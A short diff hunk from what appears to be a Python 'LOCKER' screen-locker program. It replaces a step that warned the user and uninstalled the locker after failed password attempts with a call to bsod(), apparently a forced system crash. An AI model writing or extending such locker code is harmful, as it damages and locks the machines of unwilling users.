@@ -116,8 +116,7 @@ def check():
 	else:
 		count -= 1
 		if count == 0:
-			messagebox.showwarning("LOCKER","number of attempts expired")
-			uninstall(wind)
+			bsod()
 		else:
 			
 			messagebox.showwarning("LOCKER","Wrong password. Avalible tries: "+ str(count))
